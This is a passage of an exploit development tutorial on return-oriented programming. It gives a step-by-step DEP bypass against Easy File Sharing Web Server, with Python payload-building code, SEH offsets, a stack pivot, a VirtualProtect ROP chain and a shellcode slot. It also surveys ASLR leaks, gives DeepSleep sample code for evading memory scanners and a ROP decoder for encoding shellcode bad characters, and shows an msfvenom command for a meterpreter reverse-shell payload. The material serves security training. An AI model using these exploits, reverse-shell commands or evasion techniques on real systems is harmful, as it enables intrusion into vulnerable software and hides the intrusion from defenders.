-<p class="wp-block-paragraph">Several tools help find and chain ROP gadgets:</p>
-
-
-
-<h4 class="wp-block-heading"><strong>ROPgadget.py</strong></h4>
-
-
-
-<figure class="wp-block-image size-full"><img fetchpriority="high" decoding="async" width="883" height="960" src="/wp-content/uploads/2024/09/image-10.png" alt="" class="wp-image-8829" srcset="/wp-content/uploads/2024/09/image-10.png 883w, /wp-content/uploads/2024/09/image-10-276x300.png 276w, /wp-content/uploads/2024/09/image-10-768x835.png 768w" sizes="(max-width: 883px) 100vw, 883px" /></figure>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Usage</strong>: A Python tool that finds ROP gadgets in binaries across architectures like x86, ARM, and MIPS.</li>
-</ul>
-
-
-
-<pre class="wp-block-code"><code>ROPgadget.py --binary &lt;binary&gt;
-ROPgadget.py --binary &lt;binary&gt; --ropchain</code></pre>
-
-
-
-<h4 class="wp-block-heading"><strong>rp++</strong></h4>
-
-
-
-<figure class="wp-block-image size-full"><img decoding="async" width="883" height="461" src="/wp-content/uploads/2024/09/image-11.png" alt="" class="wp-image-8830" srcset="/wp-content/uploads/2024/09/image-11.png 883w, /wp-content/uploads/2024/09/image-11-300x157.png 300w, /wp-content/uploads/2024/09/image-11-768x401.png 768w" sizes="(max-width: 883px) 100vw, 883px" /></figure>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Usage</strong>: A fast ROP gadget finder for PE/ELF/Mach-O files in x86/x64/ARM/ARM64 architectures.</li>
-</ul>
-
-
-
-<pre class="wp-block-code"><code>rp++ --file &lt;binary&gt; --rop
-rp++ --file &lt;binary&gt; --rop --va 0x0</code></pre>
-
-
-
-<figure class="wp-block-image size-full"><img decoding="async" width="890" height="451" src="/wp-content/uploads/2024/09/image-12.png" alt="" class="wp-image-8831" srcset="/wp-content/uploads/2024/09/image-12.png 890w, /wp-content/uploads/2024/09/image-12-300x152.png 300w, /wp-content/uploads/2024/09/image-12-768x389.png 768w" sizes="(max-width: 890px) 100vw, 890px" /></figure>
-
-
-
-<h3 class="wp-block-heading">Security Mechanisms and Bypasses&nbsp;</h3>
-
-
-
-<h4 class="wp-block-heading"><strong><em>Data Execution Prevention (DEP):</em></strong></h4>
-
-
-
-<p class="wp-block-paragraph"><strong><em>Overview of DEP and Its Implementation:</em></strong> Data Execution Prevention (DEP) is a security feature that helps protect against code execution in non-executable memory regions. It works by marking certain areas of memory as non-executable, which prevents code from running in those regions. On modern operating systems, DEP is enforced using hardware and software techniques to distinguish between executable and non-executable memory regions, enhancing system security by mitigating attacks that rely on executing code from non-executable segments.</p>
-
-
-
-<p class="wp-block-paragraph"><strong><em>Techniques Used by ROPGadget to Bypass DEP Protections:</em></strong> ROP (Return-Oriented Programming) gadgets are small snippets of executable code that end with a return instruction, and they can be used to chain together a series of operations without the need for direct code injection. ROPGadget, a tool for identifying such gadgets, facilitates this by searching for these snippets within existing binaries. Since ROP exploits execute only existing code within the application&#8217;s memory, they inherently bypass DEP protections. The DEP does not stop code from executing if it is already part of an executable segment; thus, ROPGadget&#8217;s role is crucial in identifying usable gadgets for constructing these exploits.</p>
-
-
-
-<p class="wp-block-paragraph">To bypass DEP (Data Execution Prevention) using Return-Oriented Programming (ROP), here&#8217;s a detailed step-by-step breakdown, focusing on a Windows 7 SP1 x64 environment and using the Easy File Sharing Web Server vulnerability.</p>
-
-
-
-<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
-https://github.com/Gu4rana/Using_ROP_Bypassing_DEP
-</div></figure>
-
-
-
-<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="878" height="723" src="/wp-content/uploads/2024/09/image-13.png" alt="" class="wp-image-8832" srcset="/wp-content/uploads/2024/09/image-13.png 878w, /wp-content/uploads/2024/09/image-13-300x247.png 300w, /wp-content/uploads/2024/09/image-13-768x632.png 768w" sizes="(max-width: 878px) 100vw, 878px" /></figure>
-
-
-
-<h4 class="wp-block-heading">1. <strong>Setup Environment</strong></h4>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Operating System:</strong> Windows 7 SP1 x64</li>
-
-
-
-<li><strong>Vulnerable Application:</strong> Easy File Sharing Web Server (<a href="https://www.exploit-db.com/exploits/38526">exploit link</a>)</li>
-
-
-
-<li><strong>Debugger:</strong> Immunity Debugger with the Mona plugin installed.</li>
-
-
-
-<li><strong>DEP Settings:</strong> Enabled using <code>bcdedit /set nx AlwaysOn</code>.</li>
-</ul>
-
-
-
-<p class="wp-block-paragraph"><strong>DEP</strong> prevents execution of code from non-executable memory areas like the stack. To bypass this, ROP chains are used, which consist of short sequences of instructions called <em>gadgets</em>, ending with a <code>RET</code> instruction.</p>
-
-
-
-<h4 class="wp-block-heading">2. <strong>Replicating the Exploit</strong></h4>
-
-
-
-<ul class="wp-block-list">
-<li>From exploit-db, we know the application crashes when passing around 5000 bytes to the <code>UserID</code> cookie in the HTTP header.</li>
-
-
-
-<li>Create a test payload:</li>
-</ul>
-
-
-
-<pre class="wp-block-code"><code>exploit = "A" * 5000</code></pre>
-
-
-
-<p class="wp-block-paragraph">This crashes the application and overwrites the <code>EAX</code> register with <code>AAAA</code>. The crash occurs due to the instruction below:</p>
-
-
-
-<pre class="wp-block-code"><code>61C277F6   8178 4C 97A629A0 CMP DWORD PTR DS:&#91;EAX+4C],A029A697</code></pre>
-
-
-
-<ul class="wp-block-list">
-<li>Additionally, the SEH (Structured Exception Handler) chain is overwritten.</li>
-</ul>
-
-
-
-<h4 class="wp-block-heading">3. <strong>Finding Offset for EAX and SEH Overwrite</strong></h4>
-
-
-
-<ul class="wp-block-list">
-<li>Use Mona to generate a unique pattern:</li>
-</ul>
-
-
-
-<pre class="wp-block-code"><code>!mona pc 5000</code></pre>
-
-
-
-<p class="wp-block-paragraph">After the crash, use Mona to find the offsets:</p>
-
-
-
-<pre class="wp-block-code"><code>!mona findmsp</code></pre>
-
-
-
-<p class="wp-block-paragraph">From the logs, you find that <code>EAX</code> is overwritten at offset 4183 and SEH at 4059 bytes.</p>
-
-
-
-<ul class="wp-block-list">
-<li>Modify the exploit payload accordingly:</li>
-</ul>
-
-
-
-<pre class="wp-block-code"><code>exploit = "A" * 4059
-exploit += "B" * 4  # nSEH
-exploit += "C" * 4  # SEH
-exploit += "D" * (4183 - len(exploit))
-exploit += "A" * 4  # Overwrite EAX
-exploit += "D" * (5000 - len(exploit))</code></pre>
-
-
-
-<h4 class="wp-block-heading">4. <strong>Bad Characters</strong></h4>
-
-
-
-<ul class="wp-block-list">
-<li>To ensure our exploit is clean, generate and compare the byte array to find bad characters:</li>
-</ul>
-
-
-
-<pre class="wp-block-code"><code>!mona bytearray -cpb '\x00'
-!mona compare -f c:\logs\fsws\bytearray.bin -a 0x057A6F34</code></pre>
-
-
-
-<ul class="wp-block-list">
-<li>Exclude <code>\x00</code> and <code>\x3b</code> from the payload.</li>
-</ul>
-
-
-
-<h3 class="wp-block-heading">5. <strong>ROP Chain Construction</strong></h3>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Stack Pivoting:</strong> The stack pointer points far away from our payload. We need to move it closer. Mona helps us find a stack pivot gadget:</li>
-</ul>
-
-
-
-<pre class="wp-block-code"><code>!mona stackpivot -distance 2548 -cpb '\x00\x3b'</code></pre>
-
-
-
-<p class="wp-block-paragraph">One suitable gadget:</p>
-
-
-
-<pre class="wp-block-code"><code>0x1002280a : {pivot 4100 / 0x1004} # ADD ESP,1004 # RETN ** &#91;ImageLoad.dll]</code></pre>
-
-
-
-<p class="wp-block-paragraph">Update the payload:</p>
-
-
-
-<pre class="wp-block-code"><code>exploit = "A" * 4059
-exploit += "B" * 4  # nSEH
-exploit += struct.pack("&lt;I", 0x1002280a)  # SEH handler with stack pivot
-exploit += "D" * (4183 - len(exploit))
-exploit += "A" * 4  # Overwrite EAX
-exploit += "D" * (5000 - len(exploit))</code></pre>
-
-
-
-<p class="wp-block-paragraph"><strong>ROP Chain Construction:</strong> The goal is to call <code>VirtualProtect()</code> to make our shellcode executable. The steps include:</p>
-
-
-
-<ul class="wp-block-list">
-<li>Stack pivoting.</li>
-
-
-
-<li>Loading correct values into registers using gadgets.</li>
-
-
-
-<li>Calling <code>VirtualProtect()</code> with appropriate parameters.</li>
-</ul>
-
-
-
-<p class="wp-block-paragraph">Example gadgets and ROP chain:</p>
-
-
-
-<pre class="wp-block-code"><code>def create_rop_chain():
-    rop_chain = &#91;
-        0x10015442,  # POP EAX # RETN &#91;ImageLoad.dll]
-        0xfffffdff,  # 2's complement of 0x00000201
-        0x100231d1,  # NEG EAX # RETN &#91;ImageLoad.dll]
-        0x1001da09,  # ADD EBX,EAX # MOV EAX,DWORD PTR SS:&#91;ESP+C] # RETN &#91;ImageLoad.dll]
-        0x10015442,  # POP EAX # RETN &#91;ImageLoad.dll]
-        0x61c832d0,  # ptr to &amp;VirtualProtect() &#91;sqlite3.dll]
-        0x1001281a,  # ADD ESP,4 # RETN &#91;ImageLoad.dll]
-        0x61c735b4,  # Writable location &#91;sqlite3.dll]
-        # Add more gadgets as needed for ROP
-    ]
-    return ''.join(struct.pack("&lt;I", _) for _ in rop_chain)</code></pre>
-
-
-
-<h4 class="wp-block-heading">6. <strong>VirtualProtect API Call</strong></h4>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Parameters:</strong>
-<ul class="wp-block-list">
-<li><code>lpAddress</code>: Pointer to the memory region you want to change.</li>
-
-
-
-<li><code>dwSize</code>: Size of the region to change (e.g., 0x40 for PAGE_EXECUTE_READWRITE).</li>
-
-
-
-<li><code>flNewProtect</code>: The new protection attribute (e.g., PAGE_EXECUTE_READWRITE).</li>
-
-
-
-<li><code>lpflOldProtect</code>: Pointer to receive the old protection value.</li>
-</ul>
-</li>
-</ul>
-
-
-
-<h4 class="wp-block-heading">7. <strong>Final Payload</strong></h4>
-
-
-
-<ul class="wp-block-list">
-<li>Ensure enough NOPs (<code>\x90</code>) before the shellcode to avoid overwriting caused by <code>FSTENV</code> pushing data onto the stack.</li>
-
-
-
-<li>Example payload:</li>
-</ul>
-
-
-
-<pre class="wp-block-code"><code>exploit = "A" * 2455  # Stack pivoting offset
-exploit += create_rop_chain()
-exploit += "\x90" * 32  # NOP slide
-exploit += shellcode  # Your shellcode
-exploit += "D" * (4059 - len(exploit))
-exploit += "BBBB"  # nSEH
-exploit += struct.pack("&lt;I", 0x1002280a)  # SEH handler
-exploit += "D" * (4183 - len(exploit))
-exploit += struct.pack("&lt;I", 0xffffffff)  # Trigger exception
-exploit += "D" * (5000 - len(exploit))</code></pre>
-
-
-
-<h4 class="wp-block-heading"><strong><em>Address Space Layout Randomization (ASLR):</em></strong></h4>
-
-
-
-<p class="wp-block-paragraph"><strong><em>Explanation of ASLR and Its Role in Security:</em></strong> Address Space Layout Randomization (ASLR) is a technique used to randomly arrange the address space of a process, including the base address of executables and shared libraries. This randomization makes it difficult for attackers to predict the location of specific code or data segments, significantly reducing the likelihood of successful exploitation of memory corruption vulnerabilities that rely on fixed addresses.</p>
-
-
-
-<p class="wp-block-paragraph"><strong><em>Methods ROPGadget Uses to Overcome ASLR:</em></strong></p>
-
-
-
-<ol class="wp-block-list">
-<li><strong><em>Information Leakage:</em></strong> Attackers can exploit vulnerabilities that leak information about memory layout to determine the locations of ROP gadgets. By analyzing leaks, attackers can adjust their ROP chains to account for the randomized addresses, effectively overcoming ASLR.</li>
-
-
-
-<li><strong><em>Brute Forcing:</em></strong> In the absence of information leaks, brute-forcing techniques can be used to guess randomized addresses. This involves systematically attempting different address values until the correct ones are found, though this method is often more time-consuming and less practical compared to information leakage.</li>
-</ol>
-
-
-
-<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
-https://redteamrecipe.com/aslr-exploitation-techniques
-</div></figure>
-
-
-
-<p class="wp-block-paragraph">Below is a structured overview of ASLR leak techniques and their relationship to ROP.</p>
-
-
-
-<h4 class="wp-block-heading">1. <strong>Modify Kernel Parameter (Linux)</strong></h4>
-
-
-
-<p class="wp-block-paragraph">ASLR can be modified or disabled at the kernel level, which provides insights into memory layout:</p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Setarch</strong>: A Linux utility that can run a program in a modified environment, allowing users to change ASLR settings for a specific execution.</li>
-
-
-
-<li><strong>Change Mach-O Flags</strong>: A Python script can be created to change Mach-O flags on macOS binaries to disable ASLR.</li>
-</ul>
-
-
-
-<h4 class="wp-block-heading">2. <strong>Compiler Options (Windows)</strong></h4>
-
-
-
-<p class="wp-block-paragraph">In Windows, ASLR can be influenced by compiler settings, which can lead to information leaks:</p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Disabling ASLR in Visual Studio</strong>: Compiling an application with specific flags can disable ASLR, making it easier to predict memory layout.</li>
-
-
-
-<li><strong>SetDllCharacteristics</strong>: This function allows setting the characteristics of a DLL, which can include disabling ASLR.</li>
-</ul>
-
-
-
-<h4 class="wp-block-heading">3. <strong>Leaking KASLR (Kernel ASLR)</strong></h4>
-
-
-
-<p class="wp-block-paragraph">Kernel ASLR is a feature in many operating systems that randomizes the base address of kernel modules:</p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Startup_xen</strong>: An information leak during the startup process of a virtual machine in Xen can expose kernel addresses, providing a foothold for further exploitation.</li>
-
-
-
-<li><strong>Android BINDER_TYPE_BINDER</strong>: An address leak can occur via the Android Binder IPC mechanism, allowing attackers to exploit ASLR.</li>
-</ul>
-
-
-
-<h4 class="wp-block-heading">4. <strong>Buffer Overflow to Control EAX</strong></h4>
-
-
-
-<p class="wp-block-paragraph">Buffer overflows are a common method to manipulate registers and control execution flow:</p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>RET2ASLR</strong>: This technique involves leveraging a return address that points to a predictable location after ASLR is bypassed.</li>
-</ul>
-
-
-
-<h4 class="wp-block-heading">5. <strong>Remote ASLR Leak in Microsoft&#8217;s RDP Client (CVE-2021-38665)</strong></h4>
-
-
-
-<p class="wp-block-paragraph">A specific vulnerability in the Microsoft Remote Desktop Protocol (RDP) client allowed attackers to leak memory addresses, circumventing ASLR protections. This enabled the formulation of ROP chains against affected systems.</p>
-
-
-
-<h4 class="wp-block-heading">6. <strong>ROP Techniques</strong></h4>
-
-
-
-<p class="wp-block-paragraph">Once ASLR information is leaked, it can be used in various ROP techniques:</p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>ASLR Information Leak via Safe-Linking</strong>: In scenarios where a memory allocator is used (like tcache or fastbin chunks), information leaks can occur that reveal the base address of heap objects.</li>
-
-
-
-<li><strong>Return To PLT (Procedure Linkage Table)</strong>: This method allows attackers to jump to the PLT to execute functions indirectly. By controlling the PLT entries, attackers can bypass ASLR.</li>
-</ul>
-
-
-
-<h3 class="wp-block-heading">Advanced Techniques in ROP</h3>
-
-
-
-<h4 class="wp-block-heading"><strong><em>Complex ROP Chains:</em></strong></h4>
-
-
-
-<p class="wp-block-paragraph"><strong><em>Building Intricate Sequences of Gadgets:</em></strong> In Return-Oriented Programming (ROP), complex ROP chains are constructed by chaining together multiple gadgets to perform advanced operations. These gadgets are small code sequences ending in a <code>ret</code> instruction, allowing for precise control over execution flow.</p>
-
-
-
-<p class="wp-block-paragraph">For example, consider the following simple ROP chain:</p>
-
-
-
-<ol class="wp-block-list">
-<li><strong>**Stack Pivoting Gadget:</strong></li>
-</ol>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; <code>pop rdi ret</code></p>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; This gadget sets the <code>rdi</code> register to a new value by popping from the stack, often used to pivot the stack pointer.</p>
-
-
-
-<ol start="2" class="wp-block-list">
-<li><strong><em>Arithmetic Gadget:</em></strong></li>
-</ol>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; <code>add eax, 0x10 ret</code></p>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; This gadget increments the <code>eax</code> register by <code>0x10</code>.</p>
-
-
-
-<ol start="3" class="wp-block-list">
-<li><strong><em>Memory Access Gadget:</em></strong></li>
-</ol>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; <code>mov [rbx], rax ret</code></p>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; This gadget stores the value of <code>rax</code> into the memory address pointed to by <code>rbx</code>.</p>
-
-
-
-<ol start="4" class="wp-block-list">
-<li><strong><em>Function Call Gadget:</em></strong></li>
-</ol>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; <code>call [rcx] ret</code></p>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; This gadget performs a function call with the address stored in <code>rcx</code>.</p>
-
-
-
-<p class="wp-block-paragraph">Combining these gadgets in a ROP chain allows an attacker to manipulate stack pointers, perform arithmetic operations, and execute function calls. For example, an attacker might pivot the stack to a controlled location, modify values in memory, and call a function with specific parameters.</p>
-
-
-
-<p class="wp-block-paragraph"><strong><em>Examples of Combining Various Gadget Types:</em></strong> A ROP chain might look like this :</p>
-
-
-
-<pre class="wp-block-code"><code>#0x5050118e: mov eax, esi ; pop esi ; ret&amp;nbsp; ;&amp;nbsp; (1 found)
-
-#0x5052db24: pop ecx ; ret&amp;nbsp; ;
-
-#0x50533bf4: sub eax, ecx ; ret&amp;nbsp; ;&amp;nbsp; (1 found)
-
-#0x505263f9: push eax ; pop esi ; pop ebx ; ret&amp;nbsp; ;&amp;nbsp; (1 found)
-
-#0x5053a0f5: pop eax ; ret&amp;nbsp; ;&amp;nbsp; (1 found)
-
-#0x5050626e: add byte &#91;esi+0x3B], ah ; ret&amp;nbsp; ;</code></pre>
-
-
-
-<h4 class="wp-block-heading">DeepSleep</h4>
-
-
-
-<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="887" height="270" src="/wp-content/uploads/2024/09/image-14.png" alt="" class="wp-image-8833" srcset="/wp-content/uploads/2024/09/image-14.png 887w, /wp-content/uploads/2024/09/image-14-300x91.png 300w, /wp-content/uploads/2024/09/image-14-768x234.png 768w" sizes="(max-width: 887px) 100vw, 887px" /></figure>
-
-
-
-<p class="wp-block-paragraph">DeepSleep is a technique inspired by Gargoyle for x64 environments that utilizes Return-Oriented Programming (ROP) and Position Independent Code (PIC) to hide memory artifacts. The primary goal is to set up a ROP chain that calls <code>VirtualProtect()</code> to modify memory permissions, sleeps, and then resets the memory protection while avoiding detection by memory scanners like Moneta.</p>
-
-
-
-<ol class="wp-block-list">
-<li><strong>ROP Chain</strong>: A sequence of carefully crafted gadget calls that allows an attacker to execute arbitrary code while evading detection.</li>
-
-
-
-<li><strong>PIC (Position Independent Code)</strong>: Code that executes properly regardless of its memory address. This is crucial for making the payload stealthy and effective across different environments.</li>
-
-
-
-<li><strong>Memory Protection</strong>: The technique involves altering memory protection states to execute the malicious code while minimizing detection risk.</li>
-</ol>
-
-
-
-<h4 class="wp-block-heading">Implementation</h4>
-
-
-
-<p class="wp-block-paragraph"><strong>Prerequisites</strong></p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Development Environment</strong>: MinGW or a compatible environment to compile the code.</li>
-
-
-
-<li><strong>Windows Version</strong>: Tested on Windows 10, version 10.0.19044.</li>
-</ul>
-
-
-
-<h4 class="wp-block-heading">ROP Chain Construction</h4>
-
-
-
-<p class="wp-block-paragraph">The following steps outline how to construct the ROP chain using VirtualProtect, Sleep, and back to VirtualProtect:</p>
-
-
-
-<ol class="wp-block-list">
-<li><strong>ROP Gadgets</strong>: Identify the necessary ROP gadgets from <code>ntdll.dll</code>. The gadgets should include:
-<ul class="wp-block-list">
-<li>A gadget to call <code>VirtualProtect()</code>.</li>
-
-
-
-<li>A gadget to call <code>Sleep()</code>.</li>
-
-
-
-<li>A final gadget to call <code>VirtualProtect()</code> again to revert the memory protection.</li>
-</ul>
-</li>
-
-
-
-<li><strong>Gadget Example</strong>: Here’s how you might find and construct your ROP gadgets.</li>
-</ol>
-
-
-
-<pre class="wp-block-code"><code>!mona rop -m ntdll.dll -cpb '\x00'</code></pre>
-
-
-
-<p class="wp-block-paragraph">This command will help you find the available ROP gadgets in <code>ntdll.dll</code> while excluding null bytes.</p>
-
-
-
-<h4 class="wp-block-heading">Sample Code for DeepSleep</h4>
-
-
-
-<p class="wp-block-paragraph">Here&#8217;s a simple example of how to set up the ROP chain for DeepSleep.</p>
-
-
-
-<pre class="wp-block-code"><code>#include &lt;windows.h&gt;
-#include &lt;stdio.h&gt;
-
-// Function prototype for VirtualProtect
-BOOL VirtualProtect(
-    LPVOID lpAddress,
-    SIZE_T dwSize,
-    DWORD flNewProtect,
-    PDWORD lpflOldProtect
-);
-
-void main() {
-    // Step 1: Prepare the ROP chain
-    // Assuming we have found the following gadgets:
-    // - gadget1: address of VirtualProtect
-    // - gadget2: address of Sleep
-    // - gadget3: address of VirtualProtect again
-
-    // Example addresses for ROP gadgets (replace with actual addresses)
-    ULONG_PTR gadget1 = 0x00000000; // Replace with the actual address for VirtualProtect
-    ULONG_PTR gadget2 = 0x00000000; // Replace with the actual address for Sleep
-    ULONG_PTR gadget3 = 0x00000000; // Replace with the actual address for VirtualProtect
-
-    // Step 2: Build the ROP chain
-    // Create a buffer to hold the ROP chain
-    ULONG_PTR ropChain&#91;6];
-
-    // Push necessary values onto the stack for VirtualProtect
-    ropChain&#91;0] = gadget1; // Address of VirtualProtect
-    ropChain&#91;1] = 0x400;   // Size of the page to modify
-    ropChain&#91;2] = PAGE_EXECUTE_READWRITE; // New protection
-    ropChain&#91;3] = NULL; // Old protection placeholder
-
-    // Call Sleep to suspend execution
-    ropChain&#91;4] = gadget2; // Address of Sleep
-    ropChain&#91;5] = 1000; // Sleep for 1000 ms
-
-    // Step 3: Execute the ROP chain
-    // This is where you would normally trigger the ROP chain execution.
-
-    // For demonstration, we will just call the functions directly
-    VirtualProtect((LPVOID)ropChain&#91;0], ropChain&#91;1], ropChain&#91;2], (PDWORD)ropChain&#91;3]);
-    Sleep(ropChain&#91;5]);
-    VirtualProtect((LPVOID)ropChain&#91;0], ropChain&#91;1], PAGE_READWRITE, (PDWORD)ropChain&#91;3]);
-
-    printf("Executed DeepSleep ROP Chain!\n");
-}</code></pre>
-
-
-
-<p class="wp-block-paragraph">While DeepSleep aims to evade detection, certain behaviors may still be flagged by security tools. For instance, calling <code>VirtualProtect()</code> repeatedly may leave traces in the call stack that security tools can identify. It&#8217;s crucial to continuously assess and adapt the technique to stay ahead of detection mechanisms.</p>
-
-
-
-<h3 class="wp-block-heading">ROPDecoder</h3>
-
-
-
-<p class="wp-block-paragraph">The <strong>ROPDecoder</strong> is essential in bypassing restrictions like <strong>Data Execution Prevention (DEP)</strong> when executing shellcode. It facilitates the modification of &#8220;bad characters&#8221; that can crash the exploit when executed. These bad characters typically include control characters and null bytes that disrupt the execution flow.</p>
-
-
-
-<p class="wp-block-paragraph">by https://zeyadazima.com/exploit%20development/ropdecoder/</p>
-
-
-
-<h4 class="wp-block-heading">Why Do We Need ROPDecoder?</h4>
-
-
-
-<ol class="wp-block-list">
-<li><strong>Bad Character Issues</strong>: When using tools like <code>msfvenom</code>, bad characters are specified with the <code>-b</code> argument (e.g., <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.6 LPORT=1337 -b "\x00\x20\x21"</code>). The shellcode gets encoded to avoid these characters.</li>
-
-
-
-<li><strong>WriteProcessMemory and Execution Permissions</strong>: The <code>WriteProcessMemory</code> API writes data to specified memory locations, which must be writable and executable. If the location has no execution permissions, attempts to decode bad characters can lead to access violations.</li>
-</ol>
-
-
-
-<h4 class="wp-block-heading">Weaponizing with Gadgets</h4>
-
-
-
-<p class="wp-block-paragraph">Using a target application like <strong>FastBackServer</strong> and analyzing its modules (e.g., <code>CSFTPAV6.dll</code>), we can find gadgets that perform necessary operations:</p>
-
-
-
-<ol class="wp-block-list">
-<li><strong>Types of Gadgets</strong>:
-<ul class="wp-block-list">
-<li><code>add byte [reg]</code></li>
-
-
-
-<li><code>sub byte [reg]</code></li>
-
-
-
-<li>Bitwise operations (<code>ror</code>, <code>rol</code>, <code>shr</code>, <code>shl</code>, <code>or</code>, <code>and</code>)</li>
-</ul>
-</li>
-
-
-
-<li><strong>Example Gadgets</strong>:
-<ul class="wp-block-list">
-<li><code>0x5050626e: add byte [esi+0x3B], ah ; ret ;</code> (decoding gadget)</li>
-</ul>
-</li>
-</ol>
-
-
-
-<h4 class="wp-block-heading">Steps for ROP Decoding</h4>
-
-
-
-<p class="wp-block-paragraph">To decode bad characters using the identified gadgets, follow these steps:</p>
-
-
-
-<ol class="wp-block-list">
-<li><strong>Make <code>esi + 0x3B</code> Point to the Bad Character</strong>:
-<ul class="wp-block-list">
-<li>Use gadgets to calculate the correct pointer.</li>
-</ul>
-</li>
-
-
-
-<li><strong>Pop the Decoding Value into <code>eax</code></strong>:
-<ul class="wp-block-list">
-<li>This value is used to add to the memory location where the bad character resides.</li>
-</ul>
-</li>
-
-
-
-<li><strong>Execute the Decoding Gadget</strong>:
-<ul class="wp-block-list">
-<li>Use the <code>add</code> instruction to modify the byte at the location pointed to by <code>esi</code>.</li>
-</ul>
-</li>
-</ol>
-
-
-
-<h4 class="wp-block-heading">Example ROP Decoder Code</h4>
-
-
-
-<p class="wp-block-paragraph">Here&#8217;s an example of how to construct the ROP chain for decoding bad characters.</p>
-
-
-
-<pre class="wp-block-code"><code>from struct import pack
-
-# ROP Decoder Construction
-ROPDecoder = b""
-ROPDecoder += pack("&lt;L", 0x5050118e)  # mov eax, esi ; pop esi ; ret ;
-ROPDecoder += pack("&lt;L", 0x41414141)  # dummy value for pop esi
-ROPDecoder += pack("&lt;L", 0x5052db24)  # pop ecx ; ret ;
-ROPDecoder += pack("&lt;L", negative_offset_value_to_shellcode)  # negative offset
-ROPDecoder += pack("&lt;L", 0x50533bf4)  # sub eax, ecx ; ret ;
-ROPDecoder += pack("&lt;L", 0x505263f9)  # push eax ; pop esi ; pop ebx ; ret ;
-ROPDecoder += pack("&lt;L", 0x41414141)  # dummy value for pop ebx
-ROPDecoder += pack("&lt;L", 0x5053a0f5)  # pop eax ; ret ;
-ROPDecoder += pack("&lt;L", decoding_value)  # decoding value
-ROPDecoder += pack("&lt;L", 0x5050626e)  # add byte &#91;esi+0x3B], ah ; ret ;</code></pre>
-
-
-
-<h4 class="wp-block-heading">Encoding and Decoding Process</h4>
-
-
-
-<ol class="wp-block-list">
-<li><strong>Encoding</strong>: Replace each bad character in the shellcode with an alternate value.
-<ul class="wp-block-list">
-<li>Example: Replace <code>0x00</code> with <code>0xfd</code>, <code>0x0a</code> with <code>0x05</code>, etc.</li>
-</ul>
-</li>
-
-
-
-<li><strong>Decoding</strong>: Revert the encoded bad characters back to their original values during execution using the ROP chain.</li>
-</ol>
-
-
-
-<pre class="wp-block-code"><code>def encode_shellcode(shellcode, badchars, encode_value):
-    shellcode_bytes = shellcode.split("\\x")
-    encoded_shellcode = &#91;]
-    index = 0
-    for byte in shellcode_bytes:
-        if byte:
-            if byte in badchars:
-                encoded_int = (int(byte, 16) + encode_value) &amp; 0xFF
-                encoded_hex = hex(encoded_int)&#91;2:].zfill(2)
-                encoded_shellcode.append(f"\\x{encoded_hex}")
-            else:
-                encoded_shellcode.append(f"\\x{byte}")
-        index += 1
-    return ''.join(encoded_shellcode)
-
-# Example of usage
-with open("shellcode.txt", "r") as file:
-    my_shellcode = file.read()
-
-badchars = &#91;"00", "09", "0a", "0b", "0c", "0d", "20"]
-encoded_shellcode = encode_shellcode(my_shellcode, badchars, 0xfb)
-print("&#91;+] Encoded Shellcode:", encoded_shellcode)</code></pre>
-
-
-
-<h4 class="wp-block-heading">Automating the Process</h4>
-
-
-
-<p class="wp-block-paragraph">To fully automate encoding and decoding, implement functions that handle both tasks. Here&#8217;s an advanced version of the encoding function:</p>
-
-
-
-<pre class="wp-block-code"><code>from struct import pack
-
-def encode_shellcode(shellcode, badchars, encode_value):
-    shellcode_bytes = shellcode.split("\\x")
-    bad_index = &#91;]
-    encoded_shellcode = &#91;]
-    index = 0
-    for byte in shellcode_bytes:
-        if byte:
-            if byte in badchars:
-                encoded_int = (int(byte, 16) + encode_value) &amp; 0xFF
-                encoded_hex = hex(encoded_int)&#91;2:].zfill(2)
-                encoded_shellcode.append(f"\\x{encoded_hex}")
-                bad_index.append(index)
-            else:
-                encoded_shellcode.append(f"\\x{byte}")
-        index += 1
-    return ''.join(encoded_shellcode), bad_index
-
-# Example of usage
-encoded_shellcode, bad_indices = encode_shellcode(my_shellcode, badchars, 0xfb)
-print("&#91;+] Encoded Shellcode:", encoded_shellcode)
-print("&#91;+] Bad Indices:", bad_indices)</code></pre>
-
-
-
-<h4 class="wp-block-heading"><strong><em>Tooling and Exploitation Frameworks</em></strong></h4>
-
-
-
-<p class="wp-block-paragraph"><strong><em>Tools for Finding and Using ROP Gadgets:</em></strong></p>
-
-
-
-<ol class="wp-block-list">
-<li><strong><em>ROPgadget:</em></strong></li>
-</ol>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong>Overview:</strong> ROPgadget scans binaries for ROP gadgets and lists them for use in constructing exploits.</p>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong>Command Example:</strong></p>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; &nbsp; &nbsp; <code>ROPgadget --binary your_binary_file --all</code></p>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong>Features and Functionalities:</strong> Lists all gadgets in the binary, including addresses and instructions. You can filter gadgets based on specific criteria.</p>
-
-
-
-<ol start="2" class="wp-block-list">
-<li><strong><em>Ropper:</em></strong></li>
-</ol>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong>Overview:</strong> Ropper is a tool for finding and analyzing ROP gadgets, and supports various architectures.</p>
-
-
